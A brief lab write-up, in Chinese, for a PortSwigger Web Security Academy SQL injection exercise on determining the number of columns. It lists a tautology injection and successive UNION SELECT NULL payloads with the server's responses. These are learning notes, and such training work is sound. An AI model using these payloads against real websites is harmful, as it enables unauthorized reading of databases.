https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

## 觀察
在 GET 輸入 ' 時產生 internal Server error
輸入 `' or 1 = 1 -- abc` 時發現注入成功

## 攻擊
這個 LAB 要找出有回傳的 column 有幾個，所以就用 UNION SELECT

```
' UNION SELECT NULL -- a			Internal Server Error
' UNION SELECT NULL, NULL -- a			Internal Server Error
' UNION SELECT NULL, NULL, NULL -- a		成功顯示頁面，故可以知道 column 有三個
```
